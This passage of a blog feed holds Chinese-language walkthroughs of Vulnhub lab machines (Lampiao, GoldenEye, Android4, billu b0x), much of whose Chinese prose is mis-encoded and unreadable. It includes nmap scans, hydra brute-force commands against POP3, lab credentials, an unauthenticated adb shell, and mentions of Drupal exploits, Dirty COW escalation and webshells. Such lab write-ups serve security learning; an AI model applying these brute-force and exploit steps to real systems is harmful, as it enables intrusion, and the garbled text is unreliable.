class="line">the other day! I can&#x27;t recall it exactly but I do remember it being</span><br><span class="line">a concatenated 4-word password....You know like &quot;eatberriesandsmile&quot;</span><br><span class="line"></span><br><span class="line">It wasn&#x27;t that, but it was something like that.... in fact I&#x27;m pretty</span><br><span class="line">sure one of those four words was actually latin... Now that I&#x27;m thinking</span><br><span class="line">about it I&#x27;m pretty sure it was &quot;baca&quot;.... well 99% sure. </span><br><span class="line">I&#x27;ve been studying latin for a few months now, so it kinda </span><br><span class="line">stuck in the memory</span><br><span class="line"></span><br><span class="line">Please don&#x27;t tell anyone I told you this b.t.w! :-)</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Nick,</span><br><span class="line"></span><br><span class="line">sorry buddy I didn&#x27;t get a chance to. The boss wants me to prove SSH</span><br><span class="line">access to root is secure, so I&#x27;m working on a few different things</span><br><span class="line">at the moment.</span><br><span class="line"></span><br><span class="line">Not having much luck to be honest!</span><br><span class="line"></span><br><span class="line">Chuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Hey Chuck, </span><br><span class="line"></span><br><span class="line">Did you manage to book the venue for the Christmas meal?</span><br><span class="line"></span><br><span class="line">Time&#x27;s ticking by, and I think we need to send out an email</span><br><span class="line">to confirm numbers or else people might not be able to come.</span><br><span class="line"></span><br><span class="line">If you want, I can give them a ring later today?</span><br><span class="line"></span><br><span class="line">Either way, let me know.</span><br><span class="line"></span><br><span class="line">Cheers,</span><br><span class="line"></span><br><span class="line">Nick</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string(0) &quot;&quot;</span><br><span class="line">halle@cyberry:~$ </span><br></pre></td></tr></table></figure><p>ç”¨crunchå»ç”Ÿæˆå¯†ç ,ç„¶åç”¨hydraå»çˆ† <img src="/images/2018/09/2018-09-15-19-02-16å±å¹•æˆªå›¾.png" alt="blacsheep" /> sshè¿ä¸Šå»,å‘ç°æ˜¯root <img src="/images/2018/09/2018-09-15-19-05-06å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="åç»­">åç»­</h2><p>åæ¥å‘ç°è¿˜æœ‰ä¸€ä¸ªææƒæ–¹æ³•,terryç”¨æˆ·å¯ä»¥æ‰§è¡Œnickç›®å½•ä¸‹é¢çš„makeberryäºŒè¿›åˆ¶æ–‡ä»¶,è€Œè¿™é‡Œæœ‰ä¸€ä¸ªæ ˆæº¢å‡º,å¯ä»¥äº¤ç»™äºŒè¿›åˆ¶æ‰‹å­æ¥åš..</p><h1 id="lampiao">lampiao</h1><p>éå¸¸ç®€å•..</p><h2 id="ä»‹ç»-1">ä»‹ç»</h2><p><a href="https://www.vulnhub.com/entry/lampiao-1,249/" title="https://www.vulnhub.com/entry/lampiao-1,249/">https://www.vulnhub.com/entry/lampiao-1,249/</a></p><h2 id="æ‰¾ipæ‰«ç«¯å£">æ‰¾ip,æ‰«ç«¯å£</h2><p>é¶æœºip:192.168.31.113 <img src="/images/2018/09/2018-09-16-01-48-59å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="æ‹¿shell">æ‹¿shell</h2><p>å»1898çœ‹ä¸‹,å‘ç°æ˜¯drupal <img src="/images/2018/09/2018-09-16-01-56-41å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç›´æ¥ç”¨drupalçš„expæ‰“ä¸€ä¸‹ <img src="/images/2018/09/2018-09-16-01-50-39å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åæ‹¿åˆ°shell <img src="/images/2018/09/2018-09-16-01-51-28å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ-1">ææƒ</h2><p>ç”¨ä¸€ä¸‹æ¢æµ‹è„šæœ¬,ç„¶åè¿™é‡Œé€‰æ‹©è„ç‰› <img src="/images/2018/09/2018-09-16-01-55-42å±å¹•æˆªå›¾.png" alt="blacsheep" /> å†™ä¸€ä¸ªwebshellç„¶åä¼ expä¸Šå»,æ‰§è¡Œä¸€ä¸‹ <img src="/images/2018/09/2018-09-16-02-08-53å±å¹•æˆªå›¾.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€å­¦ä¹ (Goldeneye)</title>
      <link href="/2018/09/14/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0goldeneye/"/>
      <url>/2018/09/14/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0goldeneye/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒ:<a href="https://www.anquanke.com/post/id/156098#h3-4" title="https://www.anquanke.com/post/id/156098#h3-4">https://www.anquanke.com/post/id/156098#h3-4</a></p><h2 id="ä¸‹è½½">ä¸‹è½½</h2><p>Goldeneyeé¶æœºä¸‹è½½:<a href="https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ" title="https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ">https://pan.baidu.com/s/1dzs_qx-YwYHk-vanbUeIxQ</a></p><h2 id="å®‰è£…åŠæ¢æµ‹">å®‰è£…åŠæ¢æµ‹</h2><p>vmboxç›´æ¥å¯¼å…¥,ç„¶åipç”¨<code>netdiscover</code> <img src="/images/2018/09/2018-09-13-23-48-47å±å¹•æˆªå›¾.png" alt="blacsheep" /> é¶æœºip:192.168.31.147 æ‰«ä¸€ä¸‹ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~$ nmap -sV -Pn -v -p- -T5 192.168.31.147</span><br></pre></td></tr></table></figure><p>ç„¶åæ‹¿åˆ°ç»“æœ <img src="/images/2018/09/2018-09-13-23-51-59å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ç«¯å£">80ç«¯å£</h2><p>å»çœ‹ä¸‹80ç«¯å£ <img src="/images/2018/09/2018-09-13-23-53-34å±å¹•æˆªå›¾.png" alt="blacsheep" /> çœ‹ä¸‹æºç ,å‘ç°terminal.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title class_">GoldenEyeText</span>: <span class="string">&quot;&lt;span&gt;&lt;br/&gt;Severnaya Auxiliary Control Station&lt;br/&gt;****TOP SECRET ACCESS****&lt;br/&gt;Accessing Server Identity&lt;br/&gt;Server Name:....................&lt;br/&gt;GOLDENEYE&lt;br/&gt;&lt;br/&gt;User: UNKNOWN&lt;br/&gt;&lt;span&gt;Naviagate to /sev-home/ to login&lt;/span&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> allElements = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;typeing&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; allElements.<span class="property">length</span>; j++) &#123;</span><br><span class="line">  <span class="keyword">var</span> currentElementId = allElements[j].<span class="property">id</span>;</span><br><span class="line">  <span class="keyword">var</span> currentElementIdContent = data[<span class="number">0</span>][currentElementId];</span><br><span class="line">  <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(currentElementId);</span><br><span class="line">  <span class="keyword">var</span> devTypeText = currentElementIdContent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>, isTag, text;</span><br><span class="line">  (<span class="keyword">function</span> <span class="title function_">type</span>(<span class="params"></span>) &#123;</span><br><span class="line">    text = devTypeText.<span class="title function_">slice</span>(<span class="number">0</span>, ++i);</span><br><span class="line">    <span class="keyword">if</span> (text === devTypeText) <span class="keyword">return</span>;</span><br><span class="line">    element.<span class="property">innerHTML</span> = text + <span class="string">`&lt;span class=&#x27;blinker&#x27;&gt;&amp;#32;&lt;/span&gt;`</span>;</span><br><span class="line">    <span class="keyword">var</span> char = text.<span class="title function_">slice</span>(-<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&lt;&quot;</span>) isTag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (char === <span class="string">&quot;&gt;&quot;</span>) isTag = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (isTag) <span class="keyword">return</span> <span class="title function_">type</span>();</span><br><span class="line">    <span class="built_in">setTimeout</span>(type, <span class="number">60</span>);</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unicodeè½¬ä¸€ä¸‹,å¾—åˆ°InvincibleHack3r <img src="/images/2018/09/2018-09-13-23-56-50å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åä¸”åˆ°/sev-home,å‘ç°ç™»å½•,é‚£ä¹ˆç›´æ¥å¸å·ç”¨boris,å¯†ç InvincibleHack3r,æˆåŠŸç™»å½• çœ‹ä¸‹æºç ,ç„¶åç¬¬ä¸€æ®µé‡è¦æºç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;/video&gt;</span><br><span class="line">&lt;div id=&quot;golden&quot;&gt;</span><br><span class="line">&lt;h1&gt;GoldenEye&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) &lt;/p&gt;</span><br><span class="line">&lt;p&gt;Please email a qualified GNO supervisor to receive the online &lt;b&gt;GoldenEye Operators Training&lt;/b&gt; to become an Administrator of the GoldenEye system&lt;/p&gt;</span><br><span class="line">&lt;p&gt;Remember, since &lt;b&gt;&lt;i&gt;security by obscurity&lt;/i&gt;&lt;/b&gt; is very effective, we have configured our pop3 service to run on a very high non-default port&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°<code>we have configured our pop3 service to run on a very high non-default port</code> ç„¶åæ‰«ç«¯å£çš„æ—¶å€™ä¹ŸçŸ¥é“pop3æ˜¯55007 ç„¶åé¡µé¢æœ€ä¸‹é¢è¿˜æœ‰ä¸€æ®µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Qualified GoldenEye Network Operator Supervisors: </span><br><span class="line">Natalya</span><br><span class="line">Boris</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬è½¬è¿‡æ¥çœ‹pop3</p><h2 id="pop3">pop3</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l Natalya -P /usr/share/wordlists/fasttrack.txt -f 192.168.31.147 -s 55007 pop3</span><br></pre></td></tr></table></figure><p><img src="/images/2018/09/2018-09-14-00-07-33å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä»¥åŠ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f 192.168.31.147 -s 55007 pop3</span><br></pre></td></tr></table></figure><figure><img src="/images/2018/09/2018-09-14-00-11-25å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login: boris   password: secret1!</span><br><span class="line">login: Natalya   password: bird</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥ncç›´æ¥è¿è¯•ä¸€ä¸‹ <img src="/images/2018/09/2018-09-14-00-22-28å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä¸‰å°é‚®ä»¶,ç­‰ä¸Šå»çœ‹ä¸‹ å¦‚æœå«Œéº»çƒ¦å¯ä»¥ç”¨thunderbird <img src="/images/2018/09/2018-09-14-00-25-37å±å¹•æˆªå›¾.png" alt="blacsheep" /> å…³é”®é‚®ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it&#x27;s related to security...even if it&#x27;s not, just enter it in under the guise of &quot;security&quot;...it&#x27;ll get the change order escalated without much hassle </span><br><span class="line"></span><br><span class="line">Ok, user creds are:</span><br><span class="line"></span><br><span class="line">username: xenia</span><br><span class="line">password: RCP90rulez!</span><br><span class="line"></span><br><span class="line">Boris verified her as a valid contractor so just create the account ok?</span><br><span class="line"></span><br><span class="line">And if you didn&#x27;t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">**Make sure to edit your host file since you usually work remote off-network....</span><br><span class="line"></span><br><span class="line">Since you&#x27;re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å»æ”¹ä¸€ä¸‹hosts <img src="/images/2018/09/2018-09-14-00-28-37å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åè¿ä¸€ä¸‹,ç”¨å‰é¢çš„å¸å·å¯†ç ç™»å½•,æ‰¾åˆ°ä¸€å°é‚®ä»¶ <img src="/images/2018/09/2018-09-14-00-33-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åhydraçˆ†ä¸€ä¸‹ <img src="/images/2018/09/2018-09-14-00-37-30å±å¹•æˆªå›¾.png" alt="blacsheep" /> pop3è¿ä¸€ä¸‹ <img src="/images/2018/09/2018-09-14-00-38-46å±å¹•æˆªå›¾.png" alt="blacsheep" /> æ‹¿åˆ°ç½‘ç«™çš„å¸å·å¯†ç ,æ¢å¸å·,å‘ç°ä¸€ä¸ªsecretæ–‡ä»¶ <img src="/images/2018/09/2018-09-14-00-40-36å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‡Œé¢å†™ç€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">007,</span><br><span class="line"></span><br><span class="line">I was able to capture this apps adm1n cr3ds through clear txt. </span><br><span class="line"></span><br><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. </span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br><span class="line"></span><br><span class="line">Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.</span><br></pre></td></tr></table></figure><p>ä¸‹è½½ä¸€ä¸‹å›¾ç‰‡,ç„¶åstringsä¸€ä¸‹ <img src="/images/2018/09/2018-09-14-00-45-07å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åbase64è§£ä¸€ä¸‹æ‰¾åˆ°å¯†ç ,å›åˆ°åå°,å¸å·admin,å¯†ç xWinter1995x!ç™»å½• ç™»å½•ä¹‹åå‘ç°cmsçš„ç‰ˆæœ¬ä¿¡æ¯ <img src="/images/2018/09/2018-09-14-14-06-22å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="msfæ‹¿shell">msfæ‹¿shell</h2><p>msfæœä¸€ä¸‹ <img src="/images/2018/09/2018-09-14-14-07-44å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‚£ä¹ˆç”¨ä¸€ä¸‹è¿™ä¸ªexp,æ³¨æ„è¦è®¾ç½®ä¸€ä¸‹è·¯å¾„ <img src="/images/2018/09/2018-09-14-14-14-58å±å¹•æˆªå›¾.png" alt="blacsheep" /> è¿è¡Œä¸€ä¸‹,å‘ç°å¤±è´¥äº† çœ‹ä¸€ä¸‹exp:<a href="https://www.exploit-db.com/exploits/29324/" title="https://www.exploit-db.com/exploits/29324/">https://www.exploit-db.com/exploits/29324/</a> å‘ç°123è¡ŒæŒ‡å®šäº†editor <img src="/images/2018/09/2018-09-14-14-12-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‚£ä¹ˆæˆ‘ä»¬å»åå°æ”¹ä¸€ä¸‹è®¾ç½® <img src="/images/2018/09/2018-09-14-14-13-35å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åè¿è¡Œ,æ‹¿åˆ°shell <img src="/images/2018/09/2018-09-14-14-14-47å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ">ææƒ</h2><p>çœ‹ä¸€ä¸‹å†…æ ¸ä¿¡æ¯,ç„¶åå»exploit-dbä¸Šçœ‹ä¸‹ <img src="/images/2018/09/2018-09-14-14-18-51å±å¹•æˆªå›¾.png" alt="blacsheep" /> çœ‹ä¸‹ä½¿ç”¨ <img src="/images/2018/09/2018-09-14-14-19-57å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‚£ä¹ˆç›´æ¥ä¸‹è½½ä¸‹æ¥å³å¯,ç„¶åå†™ä¸€ä¸ªæœ¨é©¬è¿›å»,æ–¹ä¾¿ä¼ æ–‡ä»¶,ç„¶åä¼ è¿›exp <img src="/images/2018/09/2018-09-14-14-21-35å±å¹•æˆªå›¾.png" alt="blacsheep" /> å›msf,ç¼–è¯‘è¿è¡Œå³å¯,ç„¶åå‘ç°ç›®æ ‡æœºæ²¡æœ‰gcc.. <img src="/images/2018/09/2018-09-14-14-24-37å±å¹•æˆªå›¾.png" alt="blacsheep" /> é‚£ä¹ˆå¯ä»¥ç”¨clangå’Œccç»•è¿‡</p><h3 id="clang">clang</h3><p><img src="/images/2018/09/2018-09-14-14-33-13å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-14-14-34-00å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h3 id="cc">cc</h3><figure><img src="/images/2018/09/2018-09-14-14-37-09å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="æ‹¿flag">æ‹¿flag</h2><p>åˆ°rootç›®å½• <img src="/images/2018/09/2018-09-14-14-38-55å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-14-14-39-37å±å¹•æˆªå›¾.png" alt="blacsheep" /></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¶æœºæ¸—é€å­¦ä¹ (androidå’Œdrupal)</title>
      <link href="/2018/09/11/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/09/11/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>å®‰å…¨å®¢:<a href="https://www.anquanke.com/post/id/158937#h2-1" title="https://www.anquanke.com/post/id/158937#h2-1">https://www.anquanke.com/post/id/158937#h2-1</a> ä¸¤ä¸ªç®€å•çš„æ¸—é€,ç¬¬ä¸€ä¸ªæ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„å®‰å“,ä¸è¿‡ç¬¬ä¸€æ¬¡ç¢°åˆ°å®‰å“æ¸—é€,çœ‹ç€åˆ«äººçš„wpåšçš„,ç¬¬äºŒä¸ªæ˜¯drupal. ç®€å•è®°å½•ä¸€ä¸‹å§</p><h1 id="android4">android4</h1><h2 id="ä¸‹è½½">ä¸‹è½½</h2><p>Android4é¶æœºä¸‹è½½ï¼š<a href="https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A" title="https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A">https://pan.baidu.com/s/1mdjXHQOYwUC8iVvHvKmo2A</a></p><h2 id="å®‰è£…">å®‰è£…</h2><p>vmboxçš„ç®¡ç†-&gt;å¯¼å…¥è™šæ‹Ÿç”µè„‘,ç„¶åå¯¼å…¥ovaæ–‡ä»¶å³å¯ <img src="/images/2018/09/2018-09-11-17-22-33å±å¹•æˆªå›¾.png" alt="blacsheep" /> å¼€æœºä¹‹å <img src="/images/2018/09/2018-09-11-17-24-44å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="æ‰¾ip">æ‰¾ip</h2><p>ç›´æ¥netdiscover <img src="/images/2018/09/18-44-23.png" alt="blacsheep" /> ç„¶åipæ˜¯192.168.1.100 æˆ–è€…<code>arp-scan -l</code>ä¹Ÿå¯ä»¥</p><h2 id="æ‰«ç«¯å£">æ‰«ç«¯å£</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p- -v -T5 192.168.1.100</span><br></pre></td></tr></table></figure><p>ç„¶åå¾—åˆ°ç»“æœ <img src="/images/2018/09/2018-09-11-18-49-51å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="æ‹¿shell">æ‹¿shell</h2><p>ç«¯å£æœ‰8080,é‚£å…ˆå»8080çœ‹ä¸‹ <img src="/images/2018/09/2018-09-11-18-58-34å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åä»–è¯´æœ‰åé—¨,é‚£ä¹ˆæ‰«ä¸€ä¸‹ç›®å½• æ‰¾åˆ°backdoor.php,ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ <img src="/images/2018/09/2018-09-11-19-02-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå»çœ‹ä¸‹22000ç«¯å£ <img src="/images/2018/09/2018-09-11-19-04-57å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°æ˜¯SSH-2.0-dropbear_2014.66 searchsploitä¸€ä¸‹ <img src="/images/2018/09/2018-09-11-19-21-33å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‘ç°ç‰ˆæœ¬ä¸å¯¹ ç„¶åå†å»çœ‹ä¸‹5555ç«¯å£ å‘ç°æ˜¯adb å»æ‰¾äº†ä¸‹èµ„æ–™,å‘ç°å®‰å“çš„é»˜è®¤adbç«¯å£å¥½åƒæ˜¯5037,ä¸è¿‡æœ‰çš„äººä¹Ÿä¹ æƒ¯æ”¹æˆ5555 çŸ¥é“äº†æ˜¯adb,é‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥å®‰è£…adbå°±å¥½äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install adb</span><br></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb connect 192.168.1.100:5555</span><br><span class="line">adb shell</span><br></pre></td></tr></table></figure><p>å°±æ‹¿åˆ°shelläº† <img src="/images/2018/09/2018-09-11-19-25-24å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå°±æ˜¯ææƒäº†,è¯´å®è¯è¿™ä¸ªææƒè›®è ¢çš„,<code>su root</code>å°±æ˜¯rootäº†.. <img src="/images/2018/09/2018-09-11-19-27-00å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶ådata/rootæ‰¾åˆ°flag <img src="/images/2018/09/2018-09-11-19-28-23å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="åç»­">åç»­</h2><p>æ—¢ç„¶éƒ½æœ‰æƒé™äº†,å†å»webç›®å½•ä¸‹é¢æ‰¾æ‰¾çœ‹åé—¨å§ åœ¨announce/backdoor.phpä¸‹é¢æ‰¾åˆ°åé—¨ <img src="/images/2018/09/2018-09-11-19-31-10å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-11-19-39-30å±å¹•æˆªå›¾.png" alt="blacsheep" /> ä¸è¿‡å¹¶ä¸èƒ½æ‹¿åˆ°flag,å› ä¸ºæ²¡æœ‰æƒé™,è¿˜æ˜¯å¾—ç”¨åˆ°shell æœ€å,ç”±äºä¹‹å‰ç™»å½•ç•Œé¢è¿›ä¸å»,ä½†æ˜¯ç°åœ¨ä¸ä¸€æ ·äº†,æˆ‘ä»¬æ˜¯rootäº†,ç›´æ¥å»æŠŠé”åˆ æ‰å°±å¥½äº† <img src="/images/2018/09/2018-09-11-19-42-02å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åå°±è¿›å»äº† <img src="/images/2018/09/2018-09-11-19-43-46å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h1 id="billu-b0x">billu b0x</h1><p>ä¸»è¦å­¦ææƒå§,ç„¶åå°±æ˜¯drupalçš„æœ€æ–°æ¼æ´</p><h2 id="ä¸‹è½½-1">ä¸‹è½½</h2><p>é¶æœºä¸‹è½½:<a href="https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ" title="https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ">https://pan.baidu.com/s/1NAAiXJUouE9AoW-wYJf_tQ</a></p><h2 id="å®‰è£…-1">å®‰è£…</h2><p>å’Œå‰é¢å®‰å“çš„ä¸€æ ·</p><h2 id="æ‰¾ip-1">æ‰¾ip</h2><p>ä¸€æ ·çš„ <img src="/images/2018/09/2018-09-12-23-39-48å±å¹•æˆªå›¾.png" alt="blacsheep" /> ip:192.168.31.10</p><h2 id="æ‰«ç«¯å£-1">æ‰«ç«¯å£</h2><figure><img src="/images/2018/09/2018-09-12-23-41-51å±å¹•æˆªå›¾.png" alt="blacsheep" /><figcaption aria-hidden="true">blacsheep</figcaption></figure><h2 id="æ‹¿shell-1">æ‹¿shell</h2><p>é¦–å…ˆå»80 ç„¶åå‘ç°æ˜¯drupal <img src="/images/2018/09/2018-09-12-23-43-18å±å¹•æˆªå›¾.png" alt="blacsheep" /> å‰æ®µæ—¶é—´æŠ¥äº†ä¸ªdrupalçš„æ¼æ´,å»msfçœ‹ä¸‹ <img src="/images/2018/09/2018-09-12-23-45-15å±å¹•æˆªå›¾.png" alt="blacsheep" /> ç„¶åç”¨ä¸€ä¸‹drupalçš„æœ€æ–°æ¼æ´,è®¾ç½®å¥½lhostå’Œrhost ç„¶åæ‹¿åˆ°åå¼¹çš„meterpreter <img src="/images/2018/09/2018-09-12-23-47-50å±å¹•æˆªå›¾.png" alt="blacsheep" /></p><h2 id="ææƒ">ææƒ</h2><p>è¿™é‡Œä¸»è¦æ˜¯å­¦ä¹ ä¸€ä¸‹ææƒçš„çŸ¥è¯† æ‹¿åˆ°shellä½†æ˜¯ä¸Šä¼ æ–‡ä»¶å¾ˆå¤æ‚,æ‰€ä»¥æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªæœ¨é©¬è¿›å»,ç„¶åèšå‰‘è¿ä¸Šå»,æ–¹ä¾¿ä¼ æ–‡ä»¶ <img src="/images/2018/09/2018-09-13-00-51-51å±å¹•æˆªå›¾.png" alt="blacsheep" /> <img src="/images/2018/09/2018-09-13-00-52-35å±å¹•æˆªå›¾.png" alt="blacsheep" /> å…ˆä¼ å‡ ä¸ªæ¢æµ‹è„šæœ¬ <img src="/images/2018/09/2018-09-13-00-58-14å±å¹•æˆªå›¾.png" alt="blacsheep" /> 